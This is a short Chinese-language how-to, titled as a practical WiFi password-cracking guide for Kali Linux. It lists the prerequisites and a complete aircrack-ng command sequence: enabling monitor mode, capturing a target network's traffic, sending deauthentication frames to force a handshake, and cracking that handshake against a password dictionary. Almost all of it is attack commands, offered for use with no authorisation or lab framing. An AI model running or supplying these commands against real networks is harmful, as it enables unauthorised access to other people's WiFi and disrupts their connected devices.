# Wifi密碼破解實戰-Kali Linux

## 事前準備
- 密碼字典
- 支持監聽模式的網卡

# 所需指令
```js
airmon-ng
airmon-ng start wlanX
airodump-ng wlanX
airodump-ng -c 11 –bssid tar:get:ss:id:he:re -w /home/user/desktop/ wlanX
aireplay-ng -0 10 -a tar:get:ss:id:he:re -c dev:ice:ss:id:he:re wlanX
aircrack-ng -w /home/user/密碼字典.txt -b ar:get:ss:id:he:re /home/user/desktop/handshake-0*.cap
```
資料來源：https://www.freedidi.com/2507.html
